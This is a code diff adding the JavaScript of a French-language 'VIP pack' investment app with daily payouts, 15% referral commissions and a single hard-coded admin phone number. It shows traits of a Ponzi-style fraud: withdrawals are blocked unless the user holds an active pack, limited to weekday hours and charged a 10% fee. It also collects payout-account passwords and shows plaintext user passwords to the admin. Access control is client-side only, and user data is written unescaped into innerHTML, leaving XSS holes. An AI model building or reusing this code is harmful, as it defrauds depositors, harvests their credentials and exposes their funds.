+                let packCfg = vipPacksData.find(p => p.id === vipId);
+                let now = Date.now();
+                let dateStr = new Date().toLocaleString();
+
+                userRef.child('activePacks').push({
+                    id: vipId, name: packCfg.name, price: price, daily: packCfg.daily,
+                    duration: packCfg.duration, purchaseTime: now, purchaseDate: dateStr,
+                    lastClaimTime: now, daysClaimed: 0, completed: false
+                }).then(() => {
+                    userRef.update({ balance: balance - price });
+                    db.ref('transactions/' + currentUserPhone).push({ type: `Activation ${packCfg.name}`, amount: -price, date: dateStr, status: "Validé" });
+                    alert("Souscription réussie !");
+                    switchTabNav('vip');
+                });
+            });
+        }
+
+        function renderActiveProducts(activePacks) {
+            const container = document.getElementById('active-products-container');
+            if (!container) return;
+            container.innerHTML = "";
+            let keys = Object.keys(activePacks);
+            if (keys.length === 0) {
+                container.innerHTML = `<div class="bg-gray-900 border border-gray-800 rounded-2xl p-5 text-center text-xs text-gray-400">Aucun module actif.</div>`;
+                return;
+            }
+            keys.forEach(key => {
+                let p = activePacks[key];
+                let status = p.completed ? `<span class="text-red-400 font-bold">Terminé</span>` : `<span class="text-cyan-400 font-bold">Actif</span>`;
+                container.innerHTML += `
+                    <div class="bg-gray-900 border border-gray-800 rounded-2xl p-4 space-y-2">
+                        <div class="flex justify-between items-center">
+                            <span class="text-sm font-bold text-white">${p.name}</span>
+                            <span>${status}</span>
+                        </div>
+                        <div class="text-xs text-gray-400 space-y-1">
+                            <div>Montant : <b class="text-white">${p.price.toLocaleString()}f</b> | Quotidien : <b class="text-cyan-400">${p.daily}f</b></div>
+                            <div>Jours validés : <b>${p.daysClaimed || 0} / ${p.duration}</b></div>
+                            <div class="text-cyan-400 pt-1 border-t border-gray-800">Prochain versement : <b>${formatCountdown((p.lastClaimTime || p.purchaseTime) + 86400000)}</b></div>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function submitRecharge(e) {
+            e.preventDefault();
+            const amount = Number(document.getElementById('recharge-amount').value);
+            const refTx = document.getElementById('recharge-ref').value.trim();
+            const dateStr = new Date().toLocaleString();
+
+            db.ref('recharges').push({
+                phone: currentUserPhone, amount: amount, reference: refTx,
+                status: 'En cours', date: dateStr, timestamp: Date.now()
+            }).then(() => {
+                db.ref('transactions/' + currentUserPhone).push({ type: "Demande de Dépôt (En attente)", amount: amount, date: dateStr, status: "En cours" });
+                alert("Demande de dépôt enregistrée. En attente de validation admin.");
+                document.getElementById('recharge-amount').value = "";
+                document.getElementById('recharge-ref').value = "";
+                switchTabNav('home');
+            });
+        }
+
+        function saveWithdrawAccount(e) {
+            e.preventDefault();
+            db.ref('users/' + currentUserPhone + '/withdrawAccount').set({
+                name: document.getElementById('acc-name').value.trim(),
+                phone: document.getElementById('acc-phone').value.trim(),
+                operator: document.getElementById('acc-operator').value,
+                pass: document.getElementById('acc-pass').value.trim()
+            }).then(() => alert("Compte de retrait enregistré avec succès."));
+        }
+
+        function submitWithdraw(e) {
+            e.preventDefault();
+            const nowD = new Date();
+            const dayOfWeek = nowD.getDay();
+            const nowH = nowD.getHours();
+
+            if (dayOfWeek === 0 || dayOfWeek === 6 || nowH < 10 || nowH >= 17) {
+                alert("Les retraits sont autorisés uniquement du Lundi au Vendredi de 10h00 à 17h00.");
+                return;
+            }
+
+            const amount = Number(document.getElementById('withdraw-amount').value);
+            if (amount < 1000) {
+                alert("Le montant minimum de retrait est de 1 000 FCFA.");
+                return;
+            }
+
+            const todayStr = nowD.toISOString().split('T')[0];
+            const uRef = db.ref('users/' + currentUserPhone);
+
+            uRef.once('value').then(snap => {
+                let d = snap.val();
+                
+                let activePacks = d.activePacks || {};
+                let hasActivePack = Object.values(activePacks).some(p => !p.completed);
+                if (!hasActivePack) {
+                    alert("Vous devez posséder au moins un module actif pour effectuer un retrait.");
+                    return;
+                }
+
+                if (d.lastWithdrawalDate === todayStr) {
+                    alert("Vous avez déjà effectué un retrait aujourd'hui.");
+                    return;
+                }
+                if (!d.withdrawAccount || (Number(d.balance)||0) < amount) {
+                    alert("Solde insuffisant ou compte de retrait non configuré.");
+                    return;
+                }
+                
+                let fee = amount * 0.10;
+                let netAmount = amount - fee;
+
+                uRef.update({ balance: Number(d.balance) - amount, lastWithdrawalDate: todayStr });
+                db.ref('withdrawals').push({
+                    phone: currentUserPhone, accountInfo: d.withdrawAccount, requestedAmount: amount,
+                    fee: fee, netAmount: netAmount, status: 'En cours', date: new Date().toLocaleString()
+                }).then(() => {
+                    db.ref('transactions/' + currentUserPhone).push({ type: "Demande de Retrait (En attente)", amount: -amount, date: new Date().toLocaleString(), status: "En cours" });
+                    alert(`Demande de retrait transmise !\nMontant net après 10% de frais : ${netAmount} FCFA`);
+                    switchTabNav('home');
+                });
+            });
+        }
+
+        function loadHistory(phone) {
+            const container = document.getElementById('history-container');
+            if (!container) return;
+            db.ref('transactions/' + phone).on('value', snap => {
+                container.innerHTML = "";
+                if (!snap.exists()) { container.innerHTML = `<div class="bg-gray-900 border border-gray-800 rounded-2xl p-6 text-center text-xs text-gray-400">Aucune opération enregistrée.</div>`; return; }
+                Object.values(snap.val()).reverse().forEach(tx => {
+                    container.innerHTML += `
+                        <div class="bg-gray-900 border border-gray-800 rounded-2xl p-3.5 flex justify-between items-center text-xs">
+                            <div><b class="text-white">${tx.type}</b><span class="block text-[10px] text-gray-400">${tx.date} (${tx.status || 'Validé'})</span></div>
+                            <div class="text-right"><b class="${tx.amount > 0 ? 'text-cyan-400' : 'text-gray-100'}">${tx.amount > 0 ? '+' : ''}${tx.amount.toLocaleString()}f</b></div>
+                        </div>
+                    `;
+                });
+            });
+        }
+
+        function copyText(t) { navigator.clipboard.writeText(t).then(() => alert("Copié : " + t)); }
+        function copyReferralLink() { copyText(document.getElementById('user-referral-link').innerText); }
+
+        function openAdminPanel() { 
+            if (currentUserPhone !== "64192087") { alert("Accès refusé."); return; }
+            document.getElementById('admin-modal').classList.remove('hidden'); 
+            loadAdminData(); 
+        }
+        function closeAdminPanel() { document.getElementById('admin-modal').classList.add('hidden'); }
+        function switchAdminTab(t) {
+            ['users', 'recharges', 'withdrawals', 'grant'].forEach(x => {
+                document.getElementById('admin-content-' + x).classList.add('hidden');
+                document.getElementById('admin-tab-' + x).className = "flex-1 py-2 font-bold rounded-xl text-gray-400 transition";
+            });
+            document.getElementById('admin-content-' + t).classList.remove('hidden');
+            document.getElementById('admin-tab-' + t).className = "flex-1 py-2 font-bold rounded-xl bg-cyan-500 text-gray-950 transition";
+        }
+
+        function loadAdminData() {
+            if (currentUserPhone !== "64192087") return;
+
+            db.ref('users').on('value', snap => {
+                const c = document.getElementById('admin-users-list'); 
+                if (!c) return;
+                c.innerHTML = "";
+                if (!snap.exists()) {
+                    c.innerHTML = `<div class="text-xs text-gray-500 text-center p-4">Aucun utilisateur inscrit.</div>`;
+                    return;
+                }
+                snap.forEach(cs => {
+                    let p = cs.key, d = cs.val();
+                    let packsHtml = "";
+                    if (d.activePacks) {
+                        Object.values(d.activePacks).forEach(pk => {
+                            packsHtml += `<div class="text-[10px] text-cyan-300">• ${pk.name} (${pk.price}f) - Jours: ${pk.daysClaimed||0}/${pk.duration}</div>`;
+                        });
+                    } else {
+                        packsHtml = `<div class="text-[10px] text-gray-500">Aucun module actif</div>`;
+                    }
+
+                    let l1Count = d.team && d.team.l1 ? Object.keys(d.team.l1).length : 0;
+
+                    c.innerHTML += `
+                        <div class="bg-gray-900 border border-gray-800 rounded-2xl p-3.5 text-xs space-y-2">
+                            <div class="flex justify-between items-center">
+                                <b class="text-cyan-400 text-sm"><i class="fa-solid fa-phone mr-1"></i> ${p}</b>
+                                <span class="text-white font-bold">Solde : ${(Number(d.balance)||0).toLocaleString()} FCFA</span>
+                            </div>
+                            <div class="text-[11px] text-gray-300">
+                                <div>Mot de passe : <span class="font-mono text-amber-400">${d.pass || '-'}</span></div>
+                                <div>Code Parrain : <span class="font-mono text-gray-400">${d.referralCode || '-'}</span> | Filleuls L1 : <span class="text-cyan-400 font-bold">${l1Count}</span></div>
+                            </div>
+                            <div class="bg-gray-950 p-2 rounded-xl border border-gray-800 space-y-1">
+                                <div class="text-[10px] text-gray-400 font-bold uppercase">Modules actifs :</div>
+                                ${packsHtml}
+                            </div>
+                            <div class="flex items-center justify-between pt-1 border-t border-gray-800">
+                                <div class="flex space-x-1">
+                                    <button type="button" onclick="adminEditBalance('${p}', ${Number(d.balance)||0})" class="bg-cyan-500/20 text-cyan-400 font-bold px-2 py-1 rounded-lg text-[10px]">Modifier Solde</button>
+                                    <button type="button" onclick="adminEditPass('${p}')" class="bg-amber-500/20 text-amber-400 font-bold px-2 py-1 rounded-lg text-[10px]">Modifier MDP</button>
+                                </div>
+                                ${p !== '64192087' ? `<button type="button" onclick="adminDeleteUser('${p}')" class="bg-red-500/20 text-red-400 font-bold px-2 py-1 rounded-lg text-[10px]">Supprimer</button>` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+            });
+
+            db.ref('recharges').on('value', snap => {
+                const c = document.getElementById('admin-recharges-list'); 
+                if (!c) return;
+                c.innerHTML = "";
+                if (!snap.exists()) { c.innerHTML = `<div class="text-xs text-gray-500">Aucun dépôt.</div>`; return; }
+                snap.forEach(cs => {
+                    let key = cs.key, d = cs.val();
+                    if (d.status === 'En cours') {
+                        c.innerHTML += `
+                            <div class="bg-gray-950 border border-gray-800 rounded-2xl p-3 text-xs space-y-2">
+                                <div class="flex justify-between"><b>Tel: ${d.phone}</b> <span class="text-cyan-400 font-bold">${d.amount.toLocaleString()} FCFA</span></div>
+                                <div class="text-[10px] text-gray-400">Réf: ${d.reference} | Date: ${d.date}</div>
+                                <div class="flex space-x-2 pt-1">
+                                    <button type="button" onclick="adminApproveRecharge('${key}', '${d.phone}', ${d.amount})" class="flex-1 bg-cyan-500 text-gray-950 py-1.5 rounded-lg font-bold">Approuver</button>
+                                    <button type="button" onclick="adminRejectRecharge('${key}')" class="flex-1 bg-red-500/20 text-red-400 py-1.5 rounded-lg font-bold">Rejeter</button>
+                                </div>
+                            </div>
+                        `;
+                    }
+                });
+            });
+
+            db.ref('withdrawals').on('value', snap => {
+                const c = document.getElementById('admin-withdrawals-list'); 
+                if (!c) return;
+                c.innerHTML = "";
+                if (!snap.exists()) { c.innerHTML = `<div class="text-xs text-gray-500">Aucun retrait.</div>`; return; }
+                snap.forEach(cs => {
+                    let key = cs.key, d = cs.val();
+                    if (d.status === 'En cours') {
+                        c.innerHTML += `
+                            <div class="bg-gray-950 border border-gray-800 rounded-2xl p-3 text-xs space-y-2">
+                                <div class="flex justify-between"><b>Tel: ${d.phone}</b> <span class="text-amber-400 font-bold">${d.requestedAmount.toLocaleString()} FCFA</span></div>
+                                <div class="text-[10px] text-gray-400">Net: ${d.netAmount}f | Nom: ${d.accountInfo?.name || '-'} (${d.accountInfo?.operator || '-'})</div>
+                                <div class="flex space-x-2 pt-1">
+                                    <button type="button" onclick="adminApproveWithdrawal('${key}', '${d.phone}')" class="flex-1 bg-cyan-500 text-gray-950 py-1.5 rounded-lg font-bold">Approuver</button>
+                                    <button type="button" onclick="adminRejectWithdrawal('${key}', '${d.phone}', ${d.requestedAmount})" class="flex-1 bg-red-500/20 text-red-400 py-1.5 rounded-lg font-bold">Rejeter & Rembourser</button>
+                                </div>
+                            </div>
+                        `;
+                    }
+                });
+            });
+        }
+
+        function adminDeleteUser(phone) {
+            if (currentUserPhone !== "64192087") return;
+            if (confirm(`Supprimer définitivement ${phone} ?`)) {
+                db.ref('users/' + phone).remove().then(() => alert("Utilisateur supprimé."));
+            }
+        }
+
+        function adminEditBalance(phone, currentBal) {
+            if (currentUserPhone !== "64192087") return;
+            let newBal = prompt(`Modifier le solde pour ${phone} :`, currentBal);
+            if (newBal !== null && !isNaN(newBal)) {
+                db.ref('users/' + phone).update({ balance: Number(newBal) }).then(() => alert("Solde mis à jour."));
+            }
+        }
+
+        function adminEditPass(phone) {
+            if (currentUserPhone !== "64192087") return;
+            let newPass = prompt(`Entrez le nouveau mot de passe pour ${phone} :`);
+            if (newPass !== null && newPass.trim() !== "") {
+                db.ref('users/' + phone).update({ pass: newPass.trim() }).then(() => alert("Mot de passe mis à jour."));
+            }
+        }
+
+        function adminApproveRecharge(key, phone, amount) {
+            if (currentUserPhone !== "64192087") return;
+            db.ref('users/' + phone).once('value').then(snap => {
+                if (!snap.exists()) return;
+                let userData = snap.val();
+                let currentBal = Number(userData.balance) || 0;
+
+                db.ref('users/' + phone).update({ balance: currentBal + amount });
+                db.ref('recharges/' + key).update({ status: 'Validé' });
+                db.ref('transactions/' + phone).push({ type: "Dépôt Approuvé", amount: amount, date: new Date().toLocaleString(), status: "Validé" });
+
+                if (userData.invitedBy) {
+                    db.ref('users').orderByChild('referralCode').equalTo(userData.invitedBy).once('value').then(refSnap => {
+                        if (refSnap.exists()) {
+                            let sponsorPhone = Object.keys(refSnap.val())[0];
+                            let sponsorData = refSnap.val()[sponsorPhone];
+                            let sponsorBalance = Number(sponsorData.balance) || 0;
+                            let commission = amount * 0.15;
+
+                            db.ref('users/' + sponsorPhone).update({ balance: sponsorBalance + commission });
+                            db.ref('transactions/' + sponsorPhone).push({
+                                type: `Commission Partenariat (L1)`,
+                                amount: commission,
+                                date: new Date().toLocaleString(),
+                                status: "Validé"
+                            });
+                        }
+                    });
+                }
+                alert("Dépôt approuvé avec succès !");
+            });
+        }
+
+        function adminRejectRecharge(key) {
+            if (currentUserPhone !== "64192087") return;
+            db.ref('recharges/' + key).update({ status: 'Rejeté' });
+            alert("Dépôt rejeté.");
+        }
+
+        function adminApproveWithdrawal(key, phone) {
+            if (currentUserPhone !== "64192087") return;
+            db.ref('withdrawals/' + key).update({ status: 'Validé' });
+            alert("Retrait approuvé.");
+        }
+
+        function adminRejectWithdrawal(key, phone, amount) {
+            if (currentUserPhone !== "64192087") return;
+            db.ref('users/' + phone).once('value').then(snap => {
+                let currentBal = Number(snap.val()?.balance) || 0;
+                db.ref('users/' + phone).update({ balance: currentBal + amount });
+                db.ref('withdrawals/' + key).update({ status: 'Rejeté' });
+                db.ref('transactions/' + phone).push({ type: "Retrait Rejeté (Remboursé)", amount: amount, date: new Date().toLocaleString(), status: "Validé" });
+                alert("Retrait rejeté et montant remboursé.");
+            });
+        }
+
+        function adminGrantPackageOrBalance() {
+            if (currentUserPhone !== "64192087") return;
+            const phone = document.getElementById('admin-target-phone').value.trim();
+            const vipId = Number(document.getElementById('admin-target-vip').value);
+            const balanceAdd = Number(document.getElementById('admin-target-balance').value) || 0;
+
+            if (!phone) { alert("Saisissez un numéro."); return; }
+
+            const uRef = db.ref('users/' + phone);
+            uRef.once('value').then(snap => {
+                if (!snap.exists()) { alert("Utilisateur introuvable."); return; }
+                let data = snap.val();
+                let currentBal = Number(data.balance) || 0;
+                let updates = { balance: currentBal + balanceAdd };
+
+                if (vipId > 0 && vipId <= 20) {
+                    let packCfg = vipPacksData.find(p => p.id === vipId);
+                    let now = Date.now();
+                    let activePacks = data.activePacks || {};
+                    let newKey = db.ref().child('users').child(phone).child('activePacks').push().key;
+                    activePacks[newKey] = {
+                        id: vipId, name: packCfg.name, price: packCfg.price, daily: packCfg.daily,
+                        duration: packCfg.duration, purchaseTime: now, purchaseDate: new Date().toLocaleString(),
+                        lastClaimTime: now, daysClaimed: 0, completed: false
+                    };
+                    updates.activePacks = activePacks;
+                }
+
+                uRef.update(updates).then(() => {
+                    alert("Attribution effectuée avec succès !");
+                    document.getElementById('admin-target-phone').value = "";
+                    document.getElementById('admin-target-balance').value = "";
+                });
+            });
+        }
+    </script>
+</body>
+</html>
